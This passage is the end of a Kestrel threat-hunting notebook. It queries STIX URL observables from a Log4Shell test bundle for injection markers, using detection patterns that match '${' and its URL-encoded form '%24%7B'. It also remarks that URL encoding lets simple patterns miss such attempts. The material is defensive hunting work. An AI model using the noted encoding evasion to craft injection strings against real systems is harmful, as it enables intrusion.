    "You may want to search for more specific STIX Cyber Observables (SCOs) like `url` or `network-traffic` (which *may* use the `http-request-ext` extension, potentially giving you visibility into HTTP request headers like `User-Agent`.\n",
    "\n",
    "For URLs, you could try a pattern like `[url:value MATCHES '\\$\\{']` but URL encoding would cause it to miss."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "229f09ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "urls = GET url\n",
    "       FROM https://raw.githubusercontent.com/opencybersecurityalliance/kestrel-analytics/release/testdata/log4shell_bundle.json\n",
    "       WHERE [url:value LIKE '${' OR url:value LIKE '%24%7B']  \n",
    "       # WHERE [url:value MATCHES '.*']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4c82efb",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Kestrel",
   "language": "kestrel",
   "name": "kestrel"
  },
  "language_info": {
   "codemirror_mode": "kestrel",
   "name": "Kestrel"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
